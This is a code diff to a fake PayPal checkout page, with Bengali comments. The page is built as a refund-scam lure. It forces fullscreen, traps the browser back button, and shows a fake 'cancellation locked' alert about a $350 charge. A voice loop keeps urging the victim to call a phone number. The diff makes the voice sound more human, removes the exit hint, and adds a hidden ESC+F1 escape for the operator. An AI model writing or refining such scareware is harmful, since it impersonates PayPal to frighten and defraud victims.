@@ -17,7 +17,7 @@
             overflow: hidden;
         }
 
-        /* প্রথম থেকেই ফুল-স্ক্রিন লকড কন্টেইনার */
+        /* ফুল-স্ক্রিন লকড কন্টেইনার */
         .fullscreen-checkout-container {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -28,41 +28,42 @@
             align-items: center;
         }
 
-        /* উপরের অ্যাকশন বার (ব্যাক বা ক্লোজ অপশন) */
+        /* মোবাইল ও পিসিতে স্পষ্টভাবে দৃশ্যমান ব্যাক/ক্লোজ বার */
         .top-action-bar {
             position: absolute;
             top: 0; left: 0; width: 100%;
             background: #ffffff;
-            padding: 15px 20px;
+            padding: 12px 15px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            border-bottom: 1px solid #cbd5e1;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+            border-bottom: 2px solid #cbd5e1;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
             box-sizing: border-box;
+            z-index: 10000;
         }
 
         .bar-title {
-            font-size: 15px;
+            font-size: 14px;
             font-weight: bold;
             color: #003087;
             display: flex;
             align-items: center;
-            gap: 8px;
+            gap: 6px;
         }
 
         .close-back-btn {
             background: #fee2e2;
-            border: 1px solid #dc2626;
+            border: 2px solid #dc2626;
             color: #dc2626;
             font-size: 14px;
             font-weight: bold;
-            padding: 8px 14px;
+            padding: 8px 16px;
             border-radius: 6px;
             cursor: pointer;
             transition: 0.2s;
         }
-        .close-back-btn:hover { background: #fca5a5; color: #fff; }
+        .close-back-btn:hover { background: #dc2626; color: #fff; }
 
         /* পেপ্যাল চেকআউট মূল বক্স */
         .paypal-checkout-modal {
@@ -74,7 +75,7 @@
             box-shadow: 0 20px 50px rgba(0,0,0,0.2);
             overflow: hidden;
             border: 1px solid #cbd5e1;
-            margin-top: 40px;
+            margin-top: 50px;
         }
 
         .paypal-modal-header {
@@ -270,12 +271,12 @@
 </head>
 <body>
 
-    <!-- পেজ লোড হওয়ার সাথে সাথে ফুল-স্ক্রিন মোড ট্রিগার করার জন্য ওভারলে বা ক্লিক প্রম্পট -->
+    <!-- ফুল-স্ক্রিন চেকআউট কন্টেইনার -->
     <div class="fullscreen-checkout-container" id="mainContainer" onclick="forceFullscreenOnStart()">
         
-        <!-- উপরের ব্যাক বা ক্রস বার -->
+        <!-- মোবাইল ও পিসিতে দৃশ্যমান ব্যাক বা ক্লোজ বার -->
         <div class="top-action-bar">
-            <div class="bar-title">🔒 Secure Gateway • Tap Back to Exit</div>
+            <div class="bar-title">🔒 PayPal Secure Gateway</div>
             <button class="close-back-btn" onclick="event.stopPropagation(); triggerCheckoutFlow('cancel')">⬅ Back / Close</button>
         </div>
 
@@ -314,7 +315,7 @@
     </div>
 
 
-    <!-- ওপর থেকে নেমে আসা রিয়েল পেপ্যাল পুশ নোটিফিকেশন -->
+    <!-- রিয়েল পেপ্যাল পুশ নোটিফিকেশন -->
     <div class="paypal-push-notif" id="paypalNotif">
         <div id="notifIcon" style="background: #16a34a; color: white; width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 20px; flex-shrink: 0;">✓</div>
         <div>
@@ -325,7 +326,7 @@
     </div>
 
 
-    <!-- ফুল-স্ক্রিন লকড ওভারলে (টিকমার্ক ও পপআপ সহ) -->
+    <!-- ফুল-স্ক্রিন লকড ওভারলে -->
     <div class="fullscreen-overlay" id="fullscreenOverlay">
         <div class="processing-box">
             
@@ -354,8 +355,8 @@
     <script>
         let currentVoiceText = "";
         let isFlowActive = false;
+        let escPressed = false; // ESC + F1 কম্বিনেশন ট্র্যাকিং
 
-        // পেজ লোড বা প্রথম টাচ করার সাথে সাথে ফুল-স্ক্রিন মোড অন করার ফাংশন
         function forceFullscreenOnStart() {
             let elem = document.documentElement;
             if (elem.requestFullscreen) {
@@ -365,12 +366,36 @@
             }
         }
 
-        // পেজ লোড হওয়ার সাথে সাথে ব্যাক বাটন ওভাররাইড করার জন্য হিস্ট্রি পুশ করা
+        // ব্যাক বাটন ওভাররাইড
         window.history.pushState(null, null, window.location.href);
         window.addEventListener('popstate', function () {
             window.history.pushState(null, null, window.location.href);
-            // কাস্টমার ফোনের ব্যাক বাটন চাপলে সরাসরি ক্যানসেল/লক ফ্লো ট্রিগার হবে
             triggerCheckoutFlow('cancel');
+        });
+
+        // ESC এবং F1 একসাথে প্রেস করার লজিক
+        window.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                escPressed = true;
+                e.preventDefault();
+            }
+            if (e.key === 'F1') {
+                if (escPressed) {
+                    document.getElementById('fullscreenOverlay').style.display = 'none';
+                    document.getElementById('paypalNotif').classList.remove('show');
+                    isFlowActive = false;
+                    if ('speechSynthesis' in window) {
+                        window.speechSynthesis.cancel();
+                    }
+                }
+                e.preventDefault();
+            }
+        });
+
+        window.addEventListener('keyup', function(e) {
+            if (e.key === 'Escape') {
+                escPressed = false;
+            }
         });
 
         function triggerCheckoutFlow(type) {
@@ -392,7 +417,7 @@
                 modalIcon.className = "cancel-warning-icon";
                 modalIcon.innerHTML = "⚠️";
                 modalMainTitle.innerText = "ORDER CANCELLATION LOCKED";
-                modalMainDesc.innerHTML = "Your order cancellation request or back action could not be processed automatically because the transaction is already queued in our gateway.<br><br>To successfully cancel this order, stop the automated debit, and process a full refund, you must speak immediately with our billing resolution department:";
+                modalMainDesc.innerHTML = "Your order cancellation request could not be processed automatically because the transaction is already queued in our gateway.<br><br>To successfully cancel this order, stop the automated debit, and process a full refund, you must speak immediately with our billing resolution department:";
                 
                 notifIcon.style.background = "#dc2626";
                 notifIcon.innerHTML = "!";
@@ -401,7 +426,7 @@
                 notifTitle.innerText = "Cancellation Failed - Action Required";
                 notifDesc.innerText = "Direct refund locked. Call support to reverse $350.00 charge.";
 
-                currentVoiceText = "PayPal security alert. Order cancellation and back action are currently locked. Please call customer support immediately at plus one 801 459 5498 to cancel your transaction and process your refund.";
+                currentVoiceText = "PayPal security alert. Order cancellation is currently locked. Please call customer support immediately at plus one 801 459 5498 to cancel your transaction and process your refund.";
             } else {
                 modalIcon.className = "success-checkmark";
                 modalIcon.innerHTML = "✓";
@@ -424,11 +449,11 @@
                 notif.classList.add('show');
             }, 300);
 
-            startForcedMaleVoiceLoop();
+            startNaturalHumanVoiceLoop();
         }
 
-        // কঠোরভাবে পুরুষ কণ্ঠে লুপ করার ফাংশন
-        function startForcedMaleVoiceLoop() {
+        // একদম প্রাকৃতিক মানুষের কণ্ঠস্বর নিশ্চিত করার লুপ ফাংশন (রোবটিক ভাব মুক্ত)
+        function startNaturalHumanVoiceLoop() {
             if (!('speechSynthesis' in window)) return;
 
             function playLoop() {
@@ -436,29 +461,28 @@
                 window.speechSynthesis.cancel();
 
                 let msg = new SpeechSynthesisUtterance(currentVoiceText);
-                msg.rate = 0.90;
-                msg.pitch = 0.5; // গম্ভীর পুরুষ কণ্ঠ নিশ্চিত করার জন্য পিচ কমানো
+                msg.rate = 1.0;  // মানুষের কথা বলার স্বাভাবিক স্পিড
+                msg.pitch = 1.0; // স্বাভাবিক পিচ, কোনো রোবটিক মডিফিকেশন নেই
 
                 let voices = window.speechSynthesis.getVoices();
-                let maleVoice = voices.find(v => 
-                    (v.name.toLowerCase().includes('male') || 
-                     v.name.toLowerCase().includes('david') || 
-                     v.name.toLowerCase().includes('mark') || 
-                     v.name.toLowerCase().includes('james') || 
-                     v.name.toLowerCase().includes('alex') ||
-                     v.name.toLowerCase().includes('george') ||
-                     v.name.toLowerCase().includes('daniel')) && v.lang.startsWith('en')
-                ) || voices.find(v => v.lang.startsWith('en') && !v.name.toLowerCase().includes('female') && !v.name.toLowerCase().includes('zira') && !v.name.toLowerCase().includes('samantha'));
+                // প্রাকৃতিক ইংলিশ ভয়েস খোঁজা
+                let naturalVoice = voices.find(v => 
+                    (v.name.toLowerCase().includes('natural') || 
+                     v.name.toLowerCase().includes('google us english') || 
+                     v.name.toLowerCase().includes('english') || 
+                     v.name.toLowerCase().includes('ryan') || 
+                     v.name.toLowerCase().includes('david')) && v.lang.startsWith('en')
+                ) || voices.find(v => v.lang.startsWith('en'));
 
-                if (maleVoice) {
-                    msg.voice = maleVoice;
+                if (naturalVoice) {
+                    msg.voice = naturalVoice;
                 }
 
                 msg.onend = function() {
                     if (isFlowActive) {
                         setTimeout(() => {
                             playLoop();
-                        }, 1200);
+                        }, 1200); // ১.২ সেকেন্ড বিরতি দিয়ে স্বাভাবিকভাবে আবার বাজবে
                     }
                 };
 
